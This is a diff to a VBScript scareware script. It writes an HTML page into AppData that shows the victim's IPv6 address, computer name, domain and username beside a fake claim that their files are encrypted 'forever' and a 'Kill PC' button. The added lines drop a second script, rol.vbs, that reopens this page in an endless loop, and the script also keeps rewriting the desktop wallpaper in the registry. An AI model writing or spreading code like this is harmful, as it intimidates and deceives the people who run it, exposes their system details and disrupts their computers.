@@ -65,7 +65,7 @@ doxxfile.writeline "<p>Ipv6: " & ipv6 & "</p>"
 doxxfile.writeline "<p>Computer Name: " & cmn & "</p>"
 doxxfile.writeline "<p>Domain: " & dm & "</p>"
 doxxfile.writeline "<p>Username: " & un & "</p>"
-doxxfile.writeline "<p>Notice: I also encrypted your files forever, you can close this window. - Bill Gates</p>"
+doxxfile.writeline "<p>Notice: I also encrypted your files forever, press this Kill PC button for the ultimate destruction. - Bill Gates</p>"
 doxxfile.writeline "<button onclick=""killpc()"">Kill PC</button>"
 doxxfile.writeline "<style>html { font-family: sans-serif; }</style>"
 doxxfile.writeline "<script>function killpc() {const textContent = 'True'; const blob = new Blob([textContent], { type: 'text/plain' }); const url = URL.createObjectURL(blob); const a = document.createElement('a'); a.href = url; a.download = 'data.txt'; document.body.appendChild(a); a.click(); document.body.removeChild(a); URL.revokeObjectURL(url);}</script>"
@@ -73,6 +73,14 @@ doxxfile.writeline "<script>function killpc() {const textContent = 'True'; const
 doxxfile.close
 
 shell.run shell.specialfolders("AppData") & "\HEAEHandxiDii.html"
+
+set runonloopfile = fso.createtextfile(shell.specialfolders("AppData") & "\rol.vbs",True)
+runonloopfile.writeline "do"
+runonloopfile.writeline "createobject(""wscript.shell"").run createobject(""wscript.shell"").specialfolders(""AppData"") & ""\HEAEHandxiDii.html"",0,True"
+runonloopfile.writeline "loop"
+runonloopfile.close
+
+shell.run shell.specialfolders("AppData") & "\rol.vbs"
 
 do
 shell.RegWrite "HKEY_CURRENT_USER\Control Panel\Desktop\Wallpaper", fso.GetParentFolderName(WScript.ScriptFullName) & "\bro.png", "REG_SZ"
